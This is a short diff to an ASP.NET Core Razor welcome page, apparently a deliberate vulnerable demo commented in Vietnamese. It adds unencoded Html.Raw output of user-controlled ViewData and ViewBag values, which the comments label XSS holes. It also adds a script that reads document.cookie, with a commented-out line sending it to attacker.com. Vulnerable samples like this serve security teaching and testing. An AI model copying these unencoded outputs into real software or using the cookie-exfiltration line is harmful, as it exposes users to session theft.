@@ -4,5 +4,20 @@
 
 <div class="text-center">
     <h1 class="display-4">Welcome</h1>
-    <p>Learn about <a href="https://learn.microsoft.com/aspnet/core">building Web apps with ASP.NET Core</a>.</p>
+
+    <!-- Lỗ hổng XSS reflected - không encode -->
+    <p>@Html.Raw(ViewData["Message"])</p>
+
+    <!-- Lỗ hổng XSS qua ViewBag -->
+    <div id="xss-target">
+        @Html.Raw(ViewBag.RawUserInput)
+    </div>
+
+    <!-- Đoạn script độc hại có thể được inject -->
+    <script>
+        // Đoạn code này sẽ thực thi nếu userInput chứa JavaScript
+        var stolenCookie = document.cookie;
+        // Có thể gửi cookie đến server attacker
+        // new Image().src = "http://attacker.com/steal?data=" + encodeURIComponent(stolenCookie);
+    </script>
 </div>
